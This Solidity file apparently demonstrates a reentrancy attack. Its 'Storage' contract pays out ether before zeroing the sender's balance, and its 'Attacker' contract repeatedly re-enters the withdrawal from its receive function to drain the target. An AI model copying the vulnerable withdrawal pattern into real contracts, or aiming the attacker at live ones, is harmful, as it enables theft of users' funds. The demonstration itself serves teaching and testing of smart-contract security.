// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.9;

contract Storage {
    mapping(address => uint256) public userBalances;

    function lock() external payable {
        userBalances[msg.sender] += msg.value;
    }

    function withdrawBalance() public {
        uint256 amountToWithdraw = userBalances[msg.sender];
        (bool success, ) = msg.sender.call{value: amountToWithdraw}("");
        require(success, "error");

        userBalances[msg.sender] = 0;
    }
}

contract Attacker {
    Storage public target;

    uint256 lockedAmount;

    constructor(address _target) {
        target = Storage(_target);
    }

    function lock() external payable {
        lockedAmount += msg.value;
        target.lock{value: msg.value}();
    }

    function withdrawBalance() external {
        target.withdrawBalance();
    }

    receive() external payable {
        if(address(target).balance >= lockedAmount) {
            target.withdrawBalance();
        }
    }
}
